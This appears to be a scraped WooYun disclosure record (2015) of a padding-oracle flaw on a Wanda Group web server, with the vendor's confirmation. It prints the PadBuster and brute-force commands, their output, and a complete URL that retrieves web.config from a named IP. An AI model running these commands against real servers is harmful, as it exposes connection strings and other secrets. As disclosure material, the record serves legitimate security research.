{"id": 70233, "wybug_id": "wooyun-2015-0136471", "wybug_title": "万达集团旗下某站配置问题可读敏感信息", "wybug_corp": "大连万达集团股份有限公司", "wybug_author": "水晶", "wybug_date": "2015-08-24 14:20", "wybug_open_date": "2015-10-08 14:54", "wybug_type": "应用配置错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["配置错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向公众公开  简要描述： 万达集团旗下某站配置问题可读敏感信息 详细说明：  检测到http://59.108.36.117:8000/WebResource.axd?d=1440148493可能存在oracle padding漏洞\n\n   漏洞证明：  1.脚本探测perl Padbuster.pl http://59.108.36.117:8000/WebResource.axd?d=9MBwmxN6TLKjC8S3CdFGyw2 9MBwmxN6TLKjC8S3CdFGyw2 16 -encoding 3 -plaintext \"|||~/web.config\"\n+-------------------------------------------+| PadBuster - v0.3                          || Brian Holyfield - Gotham Digital Science  || labs@gdssecurity.com                      |+-------------------------------------------+INFO: The original request returned the following[+] Status: 500[+] Location: N/A[+] Content Length: 4587INFO: Starting PadBuster Encrypt Mode[+] Number of Blocks: 1INFO: No error string was provided...starting response analysisERROR: 500 Can't connect to 59.108.36.117:8000 (10060)   Retrying in 10 seconds...*** Response Analysis Complete ***The following response signatures were returned:-------------------------------------------------------ID#     Freq    Status  Length  Location-------------------------------------------------------1       1       500     3468    N/A2 **    255     500     4587    N/A-------------------------------------------------------Enter an ID that matches the error conditionNOTE: The ID# marked with ** is recommended : 2Continuing test with selection 2[+] Success: (224) [Byte 16][+] Success: (75) [Byte 15][+] Success: (19) [Byte 14][+] Success: (0) [Byte 13][+] Success: (128) [Byte 12][+] Success: (60) [Byte 11][+] Success: (172) [Byte 10]ERROR: 500 Can't connect to 59.108.36.117:8000 (10060)   Retrying in 10 seconds...[+] Success: (11) [Byte 9][+] Success: (191) [Byte 8][+] Success: (64) [Byte 7][+] Success: (231) [Byte 6][+] Success: (121) [Byte 5][+] Success: (249) [Byte 4][+] Success: (184) [Byte 3][+] Success: (112) [Byte 2][+] Success: (245) [Byte 1]Block 1 Results:[+] New Cipher Text (HEX): 9903ca8a5a9b2fd42dc855eb62792ee0[+] Intermediate Bytes (HEX): e57fb6f475ec4ab603ab3a85041049e1-------------------------------------------------------** Finished ***[+] Encrypted value is: mQPKilqbL9QtyFXrYnku4AAAAAAAAAAAAAAAAAAAAAA1\n拿到了web.config的URL的加密地址：mQPKilqbL9QtyFXrYnku4AAAAAAAAAAAAAAAAAAAAAA12.利用脚本继续填充perl Web.config_bruter.pl http://59.108.36.117:8000/ScriptResource.axd mQPKilqbL9QtyFXrYnku4AAAAAAAAAAAAAAAAAAAAAA1 16\n\n得到了加密字符串：CX8PD2QimGkjB3nMBDaKRJkDyopamy_ULchV62J5LuAAAAAAAAAAAAAAAAAAAAAA03.这样就得到了Web.Config完整的访问地址http://59.108.36.117:8000/ScriptResource.axd?d=CX8PD2QimGkjB3nMBDaKRJkDyopamy_ULchV62J5LuAAAAAAAAAAAAAAAAAAAAAA0\n\n看到了连接字符串，虽然连的是本机，但是安全无大小，要注意这些细节啊。   修复方案：  升级补丁   版权声明：转载请注明来源 水晶@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-08-24 14:53 厂商回复： 感谢水晶同学的关注与贡献，马上通知业务整改！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}